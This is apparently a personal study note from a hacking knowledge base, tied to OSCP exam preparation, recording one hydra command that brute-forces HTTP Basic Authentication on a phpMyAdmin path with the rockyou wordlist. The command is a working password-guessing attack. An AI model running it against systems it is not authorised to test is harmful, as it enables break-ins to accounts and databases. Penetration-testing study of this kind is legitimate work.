# hydra brute force HTTP Basic Authentication
```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f $IP http-get /phpmyadmin/ -t 15
```

` zet/20221003150743/README.md `

# Related

- [20221014185908](/zet/20221014185908/README.md) kb file named kb/hacking/commands/hydra.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:

    #command #hacking #hydra 
